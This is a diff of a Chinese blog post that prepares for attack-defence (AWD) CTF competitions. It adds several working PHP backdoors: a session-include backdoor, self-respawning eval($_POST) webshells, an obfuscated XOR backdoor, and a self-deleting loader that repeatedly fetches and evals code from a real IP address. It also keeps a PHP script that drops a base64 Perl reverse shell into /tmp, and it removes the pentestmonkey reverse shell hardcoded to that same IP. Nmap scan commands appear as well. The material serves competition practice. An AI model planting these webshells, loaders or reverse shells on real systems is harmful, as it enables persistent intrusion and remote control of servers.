@@ -3,7 +3,7 @@ title: awd准备工作
 password: awd-prepare
 abbrlink: 12920
 date: 2018-08-21 10:32:18
-tags: ctf
+tags: 
 ---
 
 # 准备工作
@@ -23,9 +23,7 @@ tags: ctf
 
   > nmap -sn 192.168.71.0/24
   >
-  > 全端口扫描: nmap -p- -sV ip地址 
-  >
-  > 全端口扫描: nmap -p 1-65535 -T4 -A -sV ip地址
+  > 全端口扫描: nmap -p- -sV ip地址
 
 * httpscan
 
@@ -274,7 +272,67 @@ if __name__ == '__main__':
 
 # 有趣 backdoor
 
-详情见: php-命令执行
+```php
+<?php
+session_start();
+extract($_GET);
+if(preg_match('/[0-9]/',$_SESSION['PHPSESSID']))
+                   exit;
+if(preg_match('//|./',$_SESSION['PHPSESSID']))
+                   exit;
+include(ini_get("session.save_path")."/sess_".$_SESSION['PHPSESSID']);
+?>
+```
+
+```php
+<?php
+ignore_user_abort(true);
+set_time_limit(0);
+$file = "veneno.php";
+$shell = "<?php eval($_POST[venenohi]);?>";
+while (TRUE) {
+    if (!file_exists($file)) {
+        file_put_contents($file, $shell);
+    }
+    usleep(50);
+}
+?>
+```
+
+```php
+<?php
+$password = "LandGrey";
+$key = substr(__FILE__,-5,-4);
+${"LandGrey"} = $_SERVER["HTTP_ACCEPT"]."Land!";
+$f = pack("H*", "13"."3f120b1655") ^ $LandGrey;
+array_intersect_uassoc(array($_REQUEST[$password] => ""), array(1), $f);
+?>
+```
+
+```php
+<?php
+    unlink($_SERVER['SCRIPT_FILENAME']);     //删除脚本
+    ignore_user_abort(true);
+    set_time_limit(0);
+    $remote_file = 'http://123.207.90.143/tmp.txt';               // 从远端获取指令
+    while($code = file_get_contents($remote_file)){
+    @eval($code);
+    sleep(5);
+};
+?>          // 不好使
+```
+
+```php
+<?php  
+    set_time_limit(0);  
+    ignore_user_abort(1);  
+    unlink(__FILE__);  
+    while(1){  
+        file_put_contents('webshell.php','<?php @eval($_POST["password"]);?>');  
+        sleep(1);  
+    }
+?>       // 好使
+```
 
 # PHP_WAF
 
@@ -543,7 +601,7 @@ scandir(base_dir)
 
 ## 有root权限
 
-直接写在配置中。
+那麽，这样就简单了，直接写在配置中。
 
 vim php.ini
 
@@ -592,48 +650,45 @@ RewriteRule ^oldpage.html$ newpage.html [R=301]            网页被永久的移
 
 # PHP反弹shell
 
-## reverse_shell1
-
 ```
 <?php 
-    function which($pr) { 
-    $path = execute("which $pr"); 
-    return ($path ? $path : $pr); 
+function which($pr) { 
+$path = execute("which $pr"); 
+return ($path ? $path : $pr); 
 } 
 function execute($cfe) { 
-    $res = ''; 
-    if ($cfe) { 
-        if(function_exists('exec')) { 
-            @exec($cfe,$res); 
-            $res = join("\n",$res); 
-        } elseif (function_exists('shell_exec')) { 
-        	$res = @shell_exec($cfe); 
-        } elseif(function_exists('system')) { 
-        	@ob_start(); 
-        	@system($cfe); 
-        	$res = @ob_get_contents(); 
-        	@ob_end_clean(); 
-        } elseif(function_exists('passthru')) { 
-            @ob_start(); 
-            @passthru($cfe); 
-        	$res = @ob_get_contents(); 
-        	@ob_end_clean(); 
-        } elseif(@is_resource($f = @popen($cfe,"r"))) { 
-        	$res = ''; 
-        	while(!@feof($f)) { 
-        		$res .= @fread($f,1024); 
-        	} 
-        	@pclose($f); 
-        } 
-    } 
-	return $res; 
+$res = ''; 
+if ($cfe) { 
+if(function_exists('exec')) { 
+@exec($cfe,$res); 
+$res = join("\n",$res); 
+} elseif(function_exists('shell_exec')) { 
+$res = @shell_exec($cfe); 
+} elseif(function_exists('system')) { 
+@ob_start(); 
+@system($cfe); 
+$res = @ob_get_contents(); 
+@ob_end_clean(); 
+} elseif(function_exists('passthru')) { 
+@ob_start(); 
+@passthru($cfe); 
+$res = @ob_get_contents(); 
+@ob_end_clean(); 
+} elseif(@is_resource($f = @popen($cfe,"r"))) { 
+$res = ''; 
+while(!@feof($f)) { 
+$res .= @fread($f,1024); 
 } 
-
+@pclose($f); 
+} 
+} 
+return $res; 
+} 
 function cf($fname,$text){ 
-    if($fp=@fopen($fname,'w')) { 
-        @fputs($fp,@base64_decode($text)); 
-        @fclose($fp); 
-	} 
+if($fp=@fopen($fname,'w')) { 
+@fputs($fp,@base64_decode($text)); 
+@fclose($fp); 
+} 
 } 
 $yourip = "your IP"; 
 $yourport = 'your port'; 
@@ -647,204 +702,6 @@ $back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c
 "OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="; 
 cf('/tmp/.bc',$back_connect); 
 $res = execute(which('perl')." /tmp/.bc $yourip $yourport &"); 
-?> 
-```
-
-首先本地： `nc -l -vv -p port `
-
-然后访问该页面即可。
-
-## reverse_shell2
-
-```
-<?php
-// php-reverse-shell - A Reverse Shell implementation in PHP
-// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
-//
-// This tool may be used for legal purposes only.  Users take full responsibility
-// for any actions performed using this tool.  The author accepts no liability
-// for damage caused by this tool.  If these terms are not acceptable to you, then
-// do not use this tool.
-//
-// In all other respects the GPL version 2 applies:
-//
-// This program is free software; you can redistribute it and/or modify
-// it under the terms of the GNU General Public License version 2 as
-// published by the Free Software Foundation.
-//
-// This program is distributed in the hope that it will be useful,
-// but WITHOUT ANY WARRANTY; without even the implied warranty of
-// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-// GNU General Public License for more details.
-//
-// You should have received a copy of the GNU General Public License along
-// with this program; if not, write to the Free Software Foundation, Inc.,
-// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
-//
-// This tool may be used for legal purposes only.  Users take full responsibility
-// for any actions performed using this tool.  If these terms are not acceptable to
-// you, then do not use this tool.
-//
-// You are encouraged to send comments, improvements or suggestions to
-// me at pentestmonkey@pentestmonkey.net
-//
-// Description
-// -----------
-// This script will make an outbound TCP connection to a hardcoded IP and port.
-// The recipient will be given a shell running as the current user (apache normally).
-//
-// Limitations
-// -----------
-// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
-// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
-// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
-//
-// Usage
-// -----
-// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
-
-set_time_limit (0);
-$VERSION = "1.0";
-$ip = '123.207.90.143';  // CHANGE THIS
-$port = 1234;       // CHANGE THIS
-$chunk_size = 1400;
-$write_a = null;
-$error_a = null;
-$shell = 'uname -a; w; id; /bin/sh -i';
-$daemon = 0;
-$debug = 0;
-
-//
-// Daemonise ourself if possible to avoid zombies later
-//
-
-// pcntl_fork is hardly ever available, but will allow us to daemonise
-// our php process and avoid zombies.  Worth a try...
-if (function_exists('pcntl_fork')) {
-	// Fork and have the parent process exit
-	$pid = pcntl_fork();
-	
-	if ($pid == -1) {
-		printit("ERROR: Can't fork");
-		exit(1);
-	}
-	
-	if ($pid) {
-		exit(0);  // Parent exits
-	}
-
-	// Make the current process a session leader
-	// Will only succeed if we forked
-	if (posix_setsid() == -1) {
-		printit("Error: Can't setsid()");
-		exit(1);
-	}
-
-	$daemon = 1;
-} else {
-	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
-}
-
-// Change to a safe directory
-chdir("/");
-
-// Remove any umask we inherited
-umask(0);
-
-//
-// Do the reverse shell...
-//
-
-// Open reverse connection
-$sock = fsockopen($ip, $port, $errno, $errstr, 30);
-if (!$sock) {
-	printit("$errstr ($errno)");
-	exit(1);
-}
-
-// Spawn shell process
-$descriptorspec = array(
-   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
-   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
-   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
-);
-
-$process = proc_open($shell, $descriptorspec, $pipes);
-
-if (!is_resource($process)) {
-	printit("ERROR: Can't spawn shell");
-	exit(1);
-}
-
-// Set everything to non-blocking
-// Reason: Occsionally reads will block, even though stream_select tells us they won't
-stream_set_blocking($pipes[0], 0);
-stream_set_blocking($pipes[1], 0);
-stream_set_blocking($pipes[2], 0);
-stream_set_blocking($sock, 0);
-
-printit("Successfully opened reverse shell to $ip:$port");
-
-while (1) {
-	// Check for end of TCP connection
-	if (feof($sock)) {
-		printit("ERROR: Shell connection terminated");
-		break;
-	}
-
-	// Check for end of STDOUT
-	if (feof($pipes[1])) {
-		printit("ERROR: Shell process terminated");
-		break;
-	}
-
-	// Wait until a command is end down $sock, or some
-	// command output is available on STDOUT or STDERR
-	$read_a = array($sock, $pipes[1], $pipes[2]);
-	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
-
-	// If we can read from the TCP socket, send
-	// data to process's STDIN
-	if (in_array($sock, $read_a)) {
-		if ($debug) printit("SOCK READ");
-		$input = fread($sock, $chunk_size);
-		if ($debug) printit("SOCK: $input");
-		fwrite($pipes[0], $input);
-	}
-
-	// If we can read from the process's STDOUT
-	// send data down tcp connection
-	if (in_array($pipes[1], $read_a)) {
-		if ($debug) printit("STDOUT READ");
-		$input = fread($pipes[1], $chunk_size);
-		if ($debug) printit("STDOUT: $input");
-		fwrite($sock, $input);
-	}
-
-	// If we can read from the process's STDERR
-	// send data down tcp connection
-	if (in_array($pipes[2], $read_a)) {
-		if ($debug) printit("STDERR READ");
-		$input = fread($pipes[2], $chunk_size);
-		if ($debug) printit("STDERR: $input");
-		fwrite($sock, $input);
-	}
-}
-
-fclose($sock);
-fclose($pipes[0]);
-fclose($pipes[1]);
-fclose($pipes[2]);
-proc_close($process);
-
-// Like print, but does nothing if we've daemonised ourself
-// (I can't figure out how to redirect STDOUT like a proper daemon)
-function printit ($string) {
-	if (!$daemon) {
-		print "$string\n";
-	}
-}
-
 ?> 
 ```
 
